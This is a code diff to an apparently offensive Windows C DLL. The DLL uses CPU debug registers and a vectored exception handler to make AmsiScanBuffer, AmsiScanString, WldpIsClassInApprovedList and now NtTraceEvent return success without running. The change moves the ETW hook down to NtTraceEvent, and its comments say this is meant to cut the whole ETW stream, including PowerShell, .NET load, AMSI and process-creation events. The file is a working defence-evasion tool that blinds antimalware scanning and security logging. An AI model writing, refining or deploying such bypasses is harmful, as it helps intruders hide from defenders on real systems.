@@ -9,7 +9,7 @@
  *   - DR0: AmsiScanBuffer  (AMSI)
  *   - DR1: AmsiScanString  (AMSI)
  *   - DR2: WldpIsClassInApprovedList (WLDP)
- *   - DR3: EtwEventWrite   (ETW)
+ *   - DR3: NtTraceEvent    (ETW - lower level, cuts whole ETW stream)
  *
  * ZERO memory patching - all via CPU debug registers + VEH.
  */
@@ -37,10 +37,14 @@ typedef HRESULT (WINAPI *fnAmsiScanString)(
 typedef HRESULT (WINAPI *fnWldpIsClassInApprovedList)(
     const GUID *classId, PBOOL isApproved, DWORD evalCriteria);
 
-/* ETW (Event Tracing for Windows) - same calling convention in x64 */
-typedef ULONG (WINAPI *fnEtwEventWrite)(
-    HANDLE RegHandle, PVOID EventDescriptor,
-    ULONG UserDataCount, PVOID UserData);
+/* ETW (Event Tracing for Windows) - NtTraceEvent is the lowest level
+ * user-mode entry for writing trace events into the ETW subsystem.
+ * Hooking this instead of EtwEventWrite cuts the whole ETW stream,
+ * because EtwEventWrite itself and most higher-level Etw* APIs end up
+ * funneling through NtTraceEvent. Same calling convention in x64. */
+typedef ULONG (WINAPI *fnNtTraceEvent)(
+    HANDLE TraceHandle, ULONG Flags,
+    ULONG FieldSize, PVOID Fields);
 
 /* ------------------------------------------------------------------ */
 /*  Globals                                                            */
@@ -54,7 +58,7 @@ static fnAmsiScanString  g_AmsiScanString  = NULL;
 static fnWldpIsClassInApprovedList g_WldpIsClassInApprovedList = NULL;
 
 /* ETW */
-static fnEtwEventWrite   g_EtwEventWrite   = NULL;
+static fnNtTraceEvent    g_NtTraceEvent    = NULL;
 
 /* Control */
 static PVOID            g_VehHandle       = NULL;
@@ -66,7 +70,7 @@ static CRITICAL_SECTION g_HookLock;
 static volatile LONG    g_HaveAmsiBuf     = 0;
 static volatile LONG    g_HaveAmsiStr     = 0;
 static volatile LONG    g_HaveWldp        = 0;
-static volatile LONG    g_HaveEtw         = 0;
+static volatile LONG    g_HaveNtTrace     = 0;
 
 /* ------------------------------------------------------------------ */
 /*  Hardware Breakpoint Helpers                                        */
@@ -110,10 +114,10 @@ BOOL SetHwbpOnThread(HANDLE hThread)
         ctx.Dr7 &= ~((DWORD64)3 << 26); /* Len2 = 00 */
     }
 
-    /* ---- DR3 = EtwEventWrite ---- */
-    if (g_EtwEventWrite)
+    /* ---- DR3 = NtTraceEvent ---- */
+    if (g_NtTraceEvent)
     {
-        ctx.Dr3 = (DWORD64)(ULONG_PTR)g_EtwEventWrite;
+        ctx.Dr3 = (DWORD64)(ULONG_PTR)g_NtTraceEvent;
         ctx.Dr7 |= (1 << 6);          /* L3 = 1 */
         ctx.Dr7 &= ~((DWORD64)3 << 28); /* R/W3 = 00 */
         ctx.Dr7 &= ~((DWORD64)3 << 30); /* Len3 = 00 */
@@ -232,35 +236,38 @@ LONG WINAPI VectoredHandler(PEXCEPTION_POINTERS ep)
     }
 
     /* ============================================================== */
-    /*  DR3: EtwEventWrite                                             */
+    /*  DR3: NtTraceEvent                                              */
     /* ============================================================== */
     /*
      * Signature:
-     *   ULONG EtwEventWrite(
-     *       HANDLE  RegHandle,       // RCX
-     *       PVOID   EventDescriptor, // RDX
-     *       ULONG   UserDataCount,   // R8
-     *       PVOID   UserData         // R9
+     *   NTSTATUS NtTraceEvent(
+     *       HANDLE TraceHandle,      // RCX
+     *       ULONG  Flags,            // RDX
+     *       ULONG  FieldSize,        // R8
+     *       PVOID  Fields            // R9
      *   );
      *
-     * We just return 0 (ERROR_SUCCESS) without executing the function.
-     * This prevents ETW from logging events like:
+     * We just return 0 (STATUS_SUCCESS) without executing the function.
+     * This cuts the ENTIRE ETW stream because NtTraceEvent is the
+     * lowest-level user-mode ETW entry point. Every EtwEventWrite /
+     * EtwWrite / TraceEvent style call eventually funnels through it,
+     * so blocking it here prevents ETW from logging events like:
      *   - PowerShell pipeline execution
      *   - .NET assembly load
      *   - AMSI scan results
      *   - Process creation, etc.
      */
-    if (g_EtwEventWrite &&
-        excAddr == (DWORD64)(ULONG_PTR)g_EtwEventWrite)
+    if (g_NtTraceEvent &&
+        excAddr == (DWORD64)(ULONG_PTR)g_NtTraceEvent)
     {
         rsp = ep->ContextRecord->Rsp;
 
         /* Just return success - no output params to modify */
-        ep->ContextRecord->Rax = 0;          /* ERROR_SUCCESS */
+        ep->ContextRecord->Rax = 0;          /* STATUS_SUCCESS */
         ep->ContextRecord->Rip = *(DWORD64 *)rsp;
         ep->ContextRecord->Rsp = rsp + 8;
         ep->ContextRecord->Dr6 &= ~0xF;
-        InterlockedIncrement(&g_HaveEtw);
+        InterlockedIncrement(&g_HaveNtTrace);
         return EXCEPTION_CONTINUE_EXECUTION;
     }
 
@@ -345,11 +352,11 @@ void PrintDebugInfo(void)
     else
         n += sprintf(buf + n, "[HWBP] DR2: WldpIsClassInApprovedList [NOT FOUND]\n");
 
-    if (g_EtwEventWrite)
-        n += sprintf(buf + n, "[HWBP] DR3: EtwEventWrite       @ 0x%p (%ld hits)\n",
-                     (void *)g_EtwEventWrite, g_HaveEtw);
+    if (g_NtTraceEvent)
+        n += sprintf(buf + n, "[HWBP] DR3: NtTraceEvent        @ 0x%p (%ld hits)\n",
+                     (void *)g_NtTraceEvent, g_HaveNtTrace);
     else
-        n += sprintf(buf + n, "[HWBP] DR3: EtwEventWrite       [NOT FOUND]\n");
+        n += sprintf(buf + n, "[HWBP] DR3: NtTraceEvent        [NOT FOUND]\n");
 
     n += sprintf(buf + n, "[HWBP] VEH: %s\n",
                  g_VehHandle ? "REGISTERED" : "NOT REGISTERED");
@@ -403,18 +410,19 @@ BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved)
         /*
          * ---- Resolve ETW functions ----
          * ntdll.dll is ALWAYS loaded in every process.
-         * EtwEventWrite is the main ETW logging function.
+         * NtTraceEvent is the lowest-level user-mode ETW entry point,
+         * hooking it cuts the whole ETW stream (not just EtwEventWrite).
          */
         hNtdll = GetModuleHandleW(L"ntdll.dll");
         if (hNtdll)
         {
-            g_EtwEventWrite = (fnEtwEventWrite)
-                GetProcAddress(hNtdll, "EtwEventWrite");
+            g_NtTraceEvent = (fnNtTraceEvent)
+                GetProcAddress(hNtdll, "NtTraceEvent");
         }
 
         /* We need at least ONE thing to hook to be useful */
         if (!g_AmsiScanBuffer && !g_AmsiScanString &&
-            !g_WldpIsClassInApprovedList && !g_EtwEventWrite)
+            !g_WldpIsClassInApprovedList && !g_NtTraceEvent)
         {
             OutputDebugStringW(L"[HWBP] No target functions found - nothing to hook!\n");
             return TRUE; /* Don't fail load, just don't hook */
@@ -481,16 +489,16 @@ __declspec(dllexport) BOOL WINAPI InstallHook(void)
             GetProcAddress(hWldp, "WldpIsClassInApprovedList");
     }
 
-    /* Load ETW */
+    /* Load ETW (NtTraceEvent from ntdll) */
     hNtdll = GetModuleHandleW(L"ntdll.dll");
     if (hNtdll)
     {
-        g_EtwEventWrite = (fnEtwEventWrite)
-            GetProcAddress(hNtdll, "EtwEventWrite");
+        g_NtTraceEvent = (fnNtTraceEvent)
+            GetProcAddress(hNtdll, "NtTraceEvent");
     }
 
     if (!g_AmsiScanBuffer && !g_AmsiScanString &&
-        !g_WldpIsClassInApprovedList && !g_EtwEventWrite)
+        !g_WldpIsClassInApprovedList && !g_NtTraceEvent)
         return FALSE;
 
     InitializeCriticalSection(&g_HookLock);
